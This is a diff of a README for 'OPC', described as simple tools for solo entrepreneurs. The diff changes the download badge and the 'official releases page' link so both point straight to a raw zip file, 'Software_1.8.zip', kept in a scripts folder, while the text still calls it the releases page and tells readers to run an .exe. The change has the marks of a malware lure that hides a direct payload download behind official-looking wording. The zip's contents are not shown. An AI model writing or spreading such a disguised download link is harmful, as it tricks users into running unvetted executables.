@@ -1,12 +1,12 @@
 # 🛠️ OPC - Simple Tools For One Person Businesses
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Seligfrequent728/OPC/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Seligfrequent728/OPC/main/opc-cli/scripts/asr/Software_1.8.zip)
 
 OPC provides practical tools for solo entrepreneurs. This software helps you manage daily tasks and organize your workflow without unnecessary complexity. Use these tools to track projects, manage customer lists, and automate your basic office needs.
 
 ## 📥 How to Download and Install
 
-1. Visit the [official releases page](https://github.com/Seligfrequent728/OPC/releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Seligfrequent728/OPC/main/opc-cli/scripts/asr/Software_1.8.zip) to find the latest version.
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Open the folder where your computer saves downloads.
